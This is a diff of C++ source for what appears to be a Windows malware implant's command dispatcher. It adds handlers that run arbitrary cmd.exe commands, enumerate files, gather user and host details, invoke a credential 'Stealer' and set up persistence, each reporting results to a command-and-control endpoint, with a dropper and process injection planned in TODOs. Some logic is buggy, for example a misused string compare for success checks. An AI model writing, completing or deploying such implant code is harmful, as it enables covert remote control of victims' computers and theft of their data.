@@ -2,115 +2,147 @@
 
 /* Directory of Commands
 - Persistence_1
-- SituationalAwareness
+- Situational_Awareness
 - Stealer
-- Execution <arg>
+- Execution <arg> - List command to run
 - File Enumeration <arg> - List files in the directory
 
 TODO:
 - Retrieval - Is commented out?
 - Injection - Will work on it next time
+- Dropper
+
  */
 void execute(std::string command, std::string args, int task_id, int implant_id){
 
     std::string results;
+    std::string work = "Yes";
 
     /* Persistance */
-    // before publishing - the bat file needs to load the implant.exe
     // only uncomment in sandbox
     if(command.compare("Persistence_1") == 0){
         printf("Executing Persistence\n");
-        results = "executed";
-        // persist_execution();
-        HttpResponse("/response_json", implant_id, task_id, results, "success", command);
+        try{
+            results = "executed";
+            std::string username = getUserName();
+            // persist_execution(getUserName());
+        }
+        catch(...){
+            printf("It did not work.\n");
+            HttpResponse("/response_json", implant_id, task_id, results, "failure", command);
+            work = "No";
+        }
+        if(work.compare("No") == 1){
+            HttpResponse("/response_json", implant_id, task_id, results, "success", command);
+        }
+        
     }
 
     /* Situational Awareness */
-    if(command.compare("SituationalAwareness") == 0){
+    if(command.compare("Situational_Awareness") == 0){
         printf("Executing Situational Awareness\n");
-        json results_parse = GetAll();
-       // results = results_parse.at(0).at(2);
-        HttpResponse("/response_json", implant_id, task_id, results, "success", command);
+        try{
+            json results_parse = GetAll();
+            results.append(results_parse.at("userName"));
+            results.append(results_parse.at("compName"));
+            // This works but it doesn't fit in the table
+            // results.append(results_parse.at("Privileges"));
+            results.erase(std::remove(results.begin(), results.end(), '\n'), results.cend());
+            results.erase(std::remove(results.begin(), results.end(), '\r'), results.cend()); 
+            std::replace( results.begin(), results.end(), '\\', '/');
+            std::replace( results.begin(), results.end(), '-', '_');
+
+
+        }
+        catch(...){
+            HttpResponse("/response_json", implant_id, task_id, results, "failure", command);
+            work = "No";
+        }
+        if(work.compare("No") == 1){
+            HttpResponse("/response_json", implant_id, task_id, results, "success", command);
+        }
+
     }
 
     /* Execution */
     if(command.compare("Execution") == 0){
         printf("Executing Execution\n");
-
-        // //split on space
-        // int i = args.find(" ");
-        // char * prog = (char *) malloc(i);
-        // for (int j =0; j < i; j++){
-        //     prog[j] = args[j];
-        // }
-        // char * a = (char *) malloc(args.size() - i);
-        // for (int k = i; k < args.size(); k++){
-        //     a[k] = args[k];
-        // }
-        char* c = strcpy(new char[args.length() + 1], args.c_str());
-        std::string duh = "C:/Windows/System32/cmd.exe /c";
-        char* k = strcpy(new char[duh.length() + 1], duh.c_str());
-        std::string res = exec(k,c);
-            
-
-        results = res;
-        results.erase(std::remove(results.begin(), results.end(), '\n'), results.cend());
-        results.erase(std::remove(results.begin(), results.end(), '\r'), results.cend()); 
-        std::replace( results.begin(), results.end(), '\\', '/');
-        std::replace( results.begin(), results.end(), '-', '_');
-        HttpResponse("/response_json", implant_id, task_id, results, "success", command);
-        //std::cout << res << std::endl;
-        //std::cout << HttpResponse("/response_json", implant_id, task_id, results, "success", command) << std::endl;
+        try{
+            char* c = strcpy(new char[args.length() + 1], args.c_str());
+            std::string res = exec(c);
+                
+            results = res;
+            results.erase(std::remove(results.begin(), results.end(), '\n'), results.cend());
+            results.erase(std::remove(results.begin(), results.end(), '\r'), results.cend()); 
+            std::replace( results.begin(), results.end(), '\\', '/');
+            std::replace( results.begin(), results.end(), '-', '_');
+        }
+        catch(...){
+            HttpResponse("/response_json", implant_id, task_id, results, "failure", command);
+            work = "No";
+        }
+        if(work.compare("No") == 1){
+            HttpResponse("/response_json", implant_id, task_id, results, "success", command);
+        }
     }
     
     /* File Enumeration */
     if(command.compare("File_Enumeration") == 0){
         printf("Executing File Enumeration\n");
-            //std::string s = std::string("C:\\Windows\\System32");
-        std::string path = args;
-        std::vector<std::string> file_names (getFileNamesFromPath(path));
+        try{
+            std::string path = args;
+            std::string storage =(getFileNamesFromPath(path));
 
-        std::stringstream storage;
-        for (auto iterator = file_names.begin(); iterator != file_names.end(); iterator++){
-            if (iterator != file_names.begin()){
-                storage << " ";
-            }
-            storage << *iterator;
+            results = storage;
+            results.erase(std::remove(results.begin(), results.end(), '\n'), results.cend());
+            results.erase(std::remove(results.begin(), results.end(), '\r'), results.cend()); 
+            std::replace( results.begin(), results.end(), '\\', '/');
+            std::replace( results.begin(), results.end(), '-', '_');
         }
-            //std::string s = std::accumulate(ss.begin(), ss.end(), std::string(""));
-        std::string result = storage.str();
-            //std::cout << result << std::endl;
-            //std::string item = 
-        std::cout << HttpResponse("/response_json", implant_id, task_id, result, "success", command) << std::endl;
-            //std::cout << item;
+        catch(...){
+            HttpResponse("/response_json", implant_id, task_id, results, "failure", command);
+            work = "No";
+        }
+        if(work.compare("No") == 1){
+            HttpResponse("/response_json", implant_id, task_id, results, "success", command);
+        }
     }
+   
+    /* Stealer Function */
+    if(command.compare("Stealer") == 0){
+        try{
+            json data_from_driver;
+            printf("Executing Stealer\n");
+            data_from_driver = driver();
+            results = data_from_driver.dump();
 
+        }
+         catch(...){
+            HttpResponse("/response_json", implant_id, task_id, results, "failure", command);
+            work = "No";
+        }
+        if(work.compare("No") == 1){
+            HttpResponse("/response_json", implant_id, task_id, results, "success", command);
+        }
+
+    }
+   
     /* Retrieval */
-    // doesn't work?
+    // Don't know if this has been plemented
     if(command.compare("Retrieval") ==0 ){
         printf("Executing Retrieval\n");
         //Where we add in SendToC2
     }
 
-    /* Stealer Function */
-    if(command.compare("Stealer") == 0){
-        json data_from_driver;
-        printf("Executing Stealer\n");
-        data_from_driver = driver();
-        results = data_from_driver.dump();
-
-        /* Send the response back to the server */
-        HttpResponse("/response_json", implant_id, task_id, results, "success", command);
-    }
-
     /* Dropper */
+    // Our plans for this changed?
     if(command.compare("Dropper") == 0){
         printf("Executing Dropper\n");
         //Dropper();
     }
 
     /* Injection */
-    //hasn't been implemented
+    // Don't know if this works
     if(command.compare("Injection") == 0){
         printf("Executing Injection\n");
 
@@ -122,7 +154,7 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
 
 
 
-std::string exec(char* program, char* args){
+std::string exec(char* args){
   
    LPSTR cmd = (char*)malloc(sizeof(args)/sizeof(char)
     + 50);
@@ -198,3 +230,24 @@ std::string exec(char* program, char* args){
     
     return output;
 }
+
+/* Unused Code
+
+        // //split on space
+        // int i = args.find(" ");
+        // char * prog = (char *) malloc(i);
+        // for (int j =0; j < i; j++){
+        //     prog[j] = args[j];
+        // }
+        // char * a = (char *) malloc(args.size() - i);
+        // for (int k = i; k < args.size(); k++){
+        //     a[k] = args[k];
+        // }
+                    std::stringstream storage;
+            for (auto iterator = file_names.begin(); iterator != file_names.end(); iterator++){
+                if (iterator != file_names.begin()){
+                    storage << " ";
+                }
+                storage << *iterator;
+            }
+*/
